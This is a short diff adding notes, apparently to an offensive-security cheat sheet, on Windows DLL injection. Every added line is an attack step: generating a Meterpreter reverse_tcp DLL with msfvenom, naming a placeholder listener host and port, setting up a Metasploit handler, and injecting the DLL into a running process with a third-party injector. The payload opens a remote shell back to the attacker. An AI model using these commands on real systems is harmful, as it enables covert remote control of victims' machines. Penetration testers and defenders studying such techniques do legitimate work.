@@ -1,1 +1,10 @@
 
+# Create the DLL malicious file
+msfvenom -p windows\meterpreter\reverse_tcp LHOST=<ip> LPORT=<port> -f dll > evil.dll
+
+# set up exploit/multi/handler on metasploit
+
+# Using the tool Remote DLL Injector from SecurityXploded (use command tasklist to check process ids)
+RemoteDLLInjector64.exe <process id> C:\path\to\evil.dll
+
+# many other DLL Injects are available on Github, check one of them if you want
